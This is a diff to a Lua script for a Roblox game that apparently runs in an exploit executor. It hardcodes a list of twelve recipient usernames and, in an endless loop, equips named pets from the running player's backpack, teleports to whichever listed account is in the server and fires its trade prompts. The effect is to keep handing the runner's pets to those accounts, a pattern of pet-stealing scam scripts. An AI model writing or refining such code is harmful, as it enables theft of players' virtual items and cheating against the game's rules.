@@ -2,16 +2,36 @@ if not game:IsLoaded() then
     repeat game.Loaded:Wait() until game:IsLoaded()
 end
 wait(10)
+
+-- ================== CONFIG ==================
 if not getgenv().Config then
 getgenv().Config = {
-    SelectUserNameTradePet = "MrsEchoSpark", -- Tên Người Dùng Cần Giao Dịch Pet
+    -- You can use a single string:
+    -- SelectUserNameTradePet = "MrsEchoSpark",
+    -- OR a list of usernames (the script will use the first one it finds in the server):
+    SelectUserNameTradePet = {
+    "TheRealKen_lake",
+    "TheRealandy_Starry",
+    "TheRealStreamDoodleY",
+    "BrooklynnShade2010",
+    "Pix3lhush",
+    "FlickerUltra",
+    "EmilyN00dleCinder",
+    "Cart3rriv3r",
+    "ItsCharlotteglow23",
+    "MrsbrookClaw",
+    "hughStarlight200884",
+    "ItsAudreyLucky2015"
+}
+
 }
 end
+
 PetsToTrade = getgenv().PetsToTrade
 if not PetsToTrade then
-   PetsToTrade = {"Ant", "Sprite", "Mantis", "Mouse","Caterpillar", "Imp", "Ostrich", "Peacock", "Macaw", "Seedling", "Snail",  "Squirrel", "Bear", "Shroomie","Owl", 
-}
+   PetsToTrade = {"Ant", "Sprite", "Mantis", "Mouse","Caterpillar", "Imp", "Ostrich", "Peacock", "Macaw", "Seedling", "Snail",  "Squirrel", "Bear", "Shroomie","Owl"}
 end
+-- ============================================
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -26,23 +46,34 @@ local function unequipCurrentTool()
     end
 end
 
+-- Find the first available target player from list/string
+-- Returns the Player instance or nil if none found in this server
 function TAFSERVICE.a()
-    local UserName = getgenv().Config.SelectUserNameTradePet
-    if UserName == "" then
-        return false
+    local sel = getgenv().Config.SelectUserNameTradePet
+    local candidates = {}
+
+    if type(sel) == "table" then
+        candidates = sel
+    elseif type(sel) == "string" and sel ~= "" then
+        candidates = {sel}
     end
-    local TargetPlayer = Players:FindFirstChild(UserName)
-    if not TargetPlayer then
-        return false
+
+    for _, name in ipairs(candidates) do
+        local p = Players:FindFirstChild(name)
+        if p then
+            return p
+        end
     end
-    return true
+    return nil
 end
 
 function TAFSERVICE.b()
     unequipCurrentTool()
-    local Backpack = LocalPlayer.Backpack
+    local Backpack = LocalPlayer:FindFirstChild("Backpack")
+    if not Backpack then return false end
+
     for _, PetName in ipairs(PetsToTrade) do
-        for i,v in pairs(Backpack:GetChildren()) do
+        for _, v in ipairs(Backpack:GetChildren()) do
             if v:IsA("Tool") and v.Name:find(PetName) then
                 return v
             end
@@ -52,7 +83,11 @@ function TAFSERVICE.b()
 end
 
 function TAFSERVICE.c(pos)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        hrp.CFrame = CFrame.new(pos)
+    end
 end
 
 function TAFSERVICE.c1(pet)
@@ -63,60 +98,87 @@ function TAFSERVICE.c1(pet)
     if not Humanoid then
         return false
     end
-    local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
-    if tool and not tool.Name:find(tostring(pet)) then
+
+    local equippedTool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
+    if equippedTool and not equippedTool.Name:find(tostring(pet)) then
         Humanoid:UnequipTools()
-        wait(.1)
+        wait(0.1)
     end
-	local Backpack = LocalPlayer.Backpack
-	local PetTool = Backpack:FindFirstChild(tostring(pet))
+
+    local Backpack = LocalPlayer:FindFirstChild("Backpack")
+    if not Backpack then return false end
+
+    local PetTool = Backpack:FindFirstChild(tostring(pet))
     if Humanoid and PetTool then
-	if PetTool:GetAttribute('d') == true then	
-		local args = {
-	PetTool
-}
-game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
-	end
+        if PetTool:GetAttribute("d") == true then
+            local args = { PetTool }
+            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
+        end
         Humanoid:EquipTool(PetTool)
-        wait(.1)
-		return true
+        wait(0.1)
+        return true
     end
+    return false
 end
 
 function TAFSERVICE.d()
-    local Pet,UserTrade = TAFSERVICE.b(),TAFSERVICE.a()
-    if not (UserTrade and Pet) then
-        print("Please set a username and have a pet to trade")
+    local Pet = TAFSERVICE.b()
+    local TargetPlayer = TAFSERVICE.a()
+
+    if not TargetPlayer then
+        print("[Trade] No target from list found in this server.")
+        return false
     end
+    if not Pet then
+        print("[Trade] No matching pet found in Backpack.")
+        return false
+    end
+
     local Status = TAFSERVICE.c1(Pet.Name)
     if not Status then
-        print("Could not equip pet")
+        print("[Trade] Could not equip pet:", Pet and Pet.Name or "nil")
+        return false
     end
-    local TargetPlayer = Players:FindFirstChild(getgenv().Config.SelectUserNameTradePet)
-    if not TargetPlayer then
-        print("Can't find player")
-    end
+
     if TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        TAFSERVICE.c(TargetPlayer.Character.HumanoidRootPart.Position)
-        wait(.1)
-        if TargetPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt") 
-            and (LocalPlayer.Character.HumanoidRootPart.Position - TargetPlayer.Character.HumanoidRootPart.Position).Magnitude < 10 then
-            pcall(function()
-            fireproximityprompt(TargetPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("ProximityPrompt"))
-            wait(0.3)
-            fireproximityprompt(TargetPlayer.Character.Head:FindFirstChildOfClass("ProximityPrompt"))
+        local targetHRP = TargetPlayer.Character.HumanoidRootPart
+        TAFSERVICE.c(targetHRP.Position)
+        wait(0.1)
+
+        local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if myHRP and (myHRP.Position - targetHRP.Position).Magnitude < 10 then
+            local ok = pcall(function()
+                local pp1 = targetHRP:FindFirstChildOfClass("ProximityPrompt")
+                if pp1 then fireproximityprompt(pp1) end
+                wait(0.3)
+                local head = TargetPlayer.Character:FindFirstChild("Head")
+                if head then
+                    local pp2 = head:FindFirstChildOfClass("ProximityPrompt")
+                    if pp2 then fireproximityprompt(pp2) end
+                end
             end)
-			return true
+            if ok then
+                print("[Trade] Prompt fired for target:", TargetPlayer.Name)
+                return true
+            else
+                print("[Trade] Failed to fire prompts for:", TargetPlayer.Name)
+                return false
+            end
+        else
+            print("[Trade] Target too far or HRP missing.")
+            return false
         end
+    else
+        print("[Trade] Target has no character/HRP.")
+        return false
     end
-    return true
 end
 
 function TAFSERVICE.RunService()
     while true do
         local status = TAFSERVICE.d()
         if status then
-            print(status)
+            print("[Trade] Attempt completed.")
         end
         wait(1)
     end
